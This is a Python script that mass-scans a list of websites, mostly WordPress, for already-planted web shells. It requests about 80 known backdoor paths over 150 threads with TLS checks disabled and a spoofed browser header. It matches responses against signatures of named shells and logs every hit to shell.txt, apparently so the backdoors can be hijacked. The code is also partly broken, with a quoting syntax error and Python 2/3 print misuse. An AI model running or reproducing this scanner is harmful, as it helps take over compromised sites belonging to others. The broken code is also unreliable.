import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ['/wso.php', '/wp-apxupx.php?apx=upx', '/wp-content/plugins/dummyyummy/wp-signup.php', '/nf_tracking.php', '/xl2023.php', '/xxl.php', '/themes.php', '/chosen.php', '/class.api.php', '/simple.php', '/wp-admin/wp-apxupx.php?apx=upx', '/wp-content/wp-apxupx.php?apx=upx', '/wp-includes/wp-apxupx.php?apx=upx', '/wp-admin/xl2023.php', '/wp-includes/xl2023.php', '/wp-content/xl2023.php', '/wp-includes/xxl.php', '/wp-content/xxl.php', '/wp-admin/xxl.php', '/wp-includes/themes.php', '/wp-content/themes.php', '/wp-admin/themes.php', '/wp-includes/class.api.php', '/wp-content/class.api.php', '/wp-admin/class.api.php', '/wp.php', '/ws.php', '/M1.php', '/fm1.php', '/wwr.php', '/404.php', '/ynz.PhP7', '/about.php', '/admin.php', '/fosil.php', '/erin1.PhP7', '/ws.php.php', '/wp-2019.php', '/wp-head.php', '/delete4.php', '/atomlib.php', '/delete5.php', '/wp-seo.php ', '/alfanew.php', '/wp-hoard.php', '/alfanew.php7', '/repeater.php', '/dropdown.php', '/delete3.php ', '/ioxi002.PhP7', '/wso-x569.php', '/alfadheat.php', '/wp-header.php', '/wso112233.php', '/shell20211028.php', '/class-snoopye_wso.php', '/autoload_classmap.php', '/wp-admin/wso.php', '/wp-content/wso.php', '/wp-includes/wso.php', '/wp-admin/wp-head.php', '/wp-admin/atomlib.php', '/wp-admin/wp-login.php', '/wp-admin/dropdown.php', '/wp-uploads-config.php', '/wp-admin/wso112233.php', '/wp-content/atomlib.php', '/wp-content/wp-head.php', '/wp-includes/wp-head.php', '/wp-includes/atomlib.php', '/wp-content/dropdown.php', '/wp-includes/network.php', '/wp-includes/wp-login.php', '/wp-content/wso112233.php', '/wp-includes/dropdown.php', '/wp-includes/wp-class.php', '/wp-includes/ID3/about.php', '/wp-includes/wso112233.php', '/wp-admin/shell20211028.php', '/wp-content/shell20211028.php', '/wp-includes/ID3/wp-login.php', '/wp-includes/shell20211028.php', '/wp-content/plugins/Cache/Cache.php/wp-content/plugins/core/include.php']

class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
		
		
	def checker(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("<title>{Ninja-Shell}</title>" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<form action="" method="post" enctype="multipart/form-data"><input type="file" name="apx"><input type="submit"></form>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<title>Simple Shell</title>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<input type="password" name="pwd" title="Password" autofocus>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<title>Fuxxer</title>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('%PDF-0-1<form action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"></form>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<a href="?">Gel4y Mini Shell</a>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('Cod3d By AnonymousFox' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<span>Upload file:</span' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<title>WIBUHAX0R1337 - ShelL</title>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('form method=post>Password: <input type=password name=pass><input type=submit value='>>'' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('<form action="" method="post" enctype="multipart/form-data"><input type="file" name="apx"><input type="submit"></form>' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass



	
Control = EvaiLCode()	
def RunUploader(site):
	try:
		Control.checker(site)
	except:
		pass
mp = Pool(150)
mp.map(RunUploader, target)
mp.close()
mp.join()